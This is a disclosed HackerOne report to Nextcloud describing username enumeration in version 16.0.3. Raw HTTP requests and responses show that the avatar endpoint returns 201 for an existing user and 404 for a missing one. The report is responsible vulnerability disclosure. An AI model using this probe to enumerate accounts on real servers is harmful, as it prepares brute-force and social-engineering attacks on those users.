# Username Enumeration

## Report Details
- **Report ID**: 667613
- **URL**: https://hackerone.com/reports/667613
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-08-05T13:42:42.335Z
- **Disclosed**: 2019-11-11T15:27:40.538Z

## Reporter
- **Username**: ahpaleus
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
Hi, it is possible to determine the existence of a user account. It reveals username which can open new attack vectors.

Version: Nextcloud 16.0.3

Request for *existing* account:
```
GET /avatar/admin/80?v=-472 HTTP/1.1
Host: localhost:8084
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: image/webp,*/*
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
```

Response:
```
HTTP/1.1 201 Created
Date: Mon, 05 Aug 2019 12:43:11 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.3.7
Set-Cookie: oce1t377r5iz=b19f9e53305ed1b27e1cf8e3a247208c; path=/; HttpOnly
Expires: Mon, 05 Aug 2019 13:13:11 +0000
Cache-Control: max-age=1800, must-revalidate
Pragma: public
Set-Cookie: oc_sessionPassphrase=TBaKNScbSUHcFfqtUUSk9opsYsCC5CjhTXspeP35sujzHmmyVisl7GQpQ6Yngg%2FwEUrD3aLUwgxdKqn9sUnwVRXtXwE9QsYom3iCnncIHDpRSOELfutM%2FhobasmvfxpJ; path=/; HttpOnly
Content-Security-Policy: default-src 'none';base-uri 'none';manifest-src 'self';script-src 'nonce-Q3FHKzg2MytoV0pEZnZ0VVBidUplSW53RG1ISXpIUmQvNW82ZnhBN1Izdz06YmU3d3c4R3d5UlVxVVpNblIvYkFOZWZEUVFyeHFqZ01wZmxSQno5Q0tCQT0=';style-src 'self' 'unsafe-inline';img-src 'self' data: blob:;font-src 'self' data:;connect-src 'self';media-src 'self';frame-ancestors 'self';worker-src 'self' blob:
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Robots-Tag: none
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: no-referrer
Set-Cookie: nc_sameSiteCookielax=true; path=/; httponly;expires=Fri, 31-Dec-2100 23:59:59 GMT; SameSite=lax
Set-Cookie: nc_sameSiteCookiestrict=true; path=/; httponly;expires=Fri, 31-Dec-2100 23:59:59 GMT; SameSite=strict
Last-Modified: Mon, 05 Aug 2019 12:42:57 +0000
ETag: "a684d35e3573baabbab61c6decb7ca27"
Content-Disposition: inline; filename="avatar.80.png"
Content-Length: 1036
Connection: close
Content-Type: image/png

PNG
(...)
```


Request for *non-existent* account:
```
GET /avatar/admin1/80?v=-472 HTTP/1.1
Host: localhost:8084
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: image/webp,*/*
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
```

Response:
```
HTTP/1.1 404 Not Found
Date: Mon, 05 Aug 2019 13:29:45 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.3.7
Set-Cookie: oce1t377r5iz=cda3160542ce283068e73ed16542d5ab; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Set-Cookie: oc_sessionPassphrase=DI98NE8f%2BG9wkqaUyWpumnB8VYIWb%2BD2qFyDIOz0xiBvryxhwcI6IEmHFDLCpdOYbOZWLuHu5tnYzPGi1I6XS8%2FJv2dyJTanfFrWouSlMGZKpex8gy78Hgg7r%2B02ZDHi; path=/; HttpOnly
Content-Security-Policy: default-src 'none';base-uri 'none';manifest-src 'self';script-src 'nonce-cXJJUWhCc25YRHBXV3ZHTThkMVFVZU5IMVdXd2NVbVM0cE1ucXlWUHpCcz06MFBwSzgxSmhEVnRrYlpubXNLUUVLSUVNNVZmVVAzL2RzdndUM1VFN2kzST0=';style-src 'self' 'unsafe-inline';img-src 'self' data: blob:;font-src 'self' data:;connect-src 'self';media-src 'self';frame-ancestors 'self';worker-src 'self' blob:
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Robots-Tag: none
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: no-referrer
Set-Cookie: nc_sameSiteCookielax=true; path=/; httponly;expires=Fri, 31-Dec-2100 23:59:59 GMT; SameSite=lax
Set-Cookie: nc_sameSiteCookiestrict=true; path=/; httponly;expires=Fri, 31-Dec-2100 23:59:59 GMT; SameSite=strict
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

## Impact

Information disclosure which opens new attack vectors - helpful for injections/brute-force attacks/social-engineering etc.

## Attachments
No attachments
